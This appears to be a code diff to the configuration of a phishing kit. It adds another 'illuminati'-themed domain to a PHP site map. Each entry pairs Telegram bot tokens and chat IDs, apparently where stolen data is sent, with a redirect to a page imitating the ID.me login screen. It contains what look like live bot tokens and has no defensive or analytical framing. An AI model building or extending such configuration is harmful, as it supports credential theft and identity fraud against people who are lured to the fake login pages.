@@ -52,6 +52,7 @@ $site_map = [
         ],
         "redirect" => "https://illuminatisyndicate.world/api.id.me/en/session/new.html"
     ],
+    
 
     'illuminatilight.world' => [
         "bots" => [
@@ -59,6 +60,16 @@ $site_map = [
             ['token' => '8064658016:AAHEcSX8Y981ebjcAveqjyhS8sGkrGnYiq4', 'chat_id' => '7575811693'],
         ],
         "redirect" => "https://illuminatilight.world/api.id.me/en/session/new.html"
+    ],
+
+
+
+    'illuminatipathtolight.world' => [
+        "bots" => [
+            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '7952525150:AAHXfhactryTuwOnidJzq6UnDGxVEFkDk8k', 'chat_id' => '7982337001'],
+        ],
+        "redirect" => "https://illuminatipathtolight.world/api.id.me/en/session/new.html"
     ],
 
 
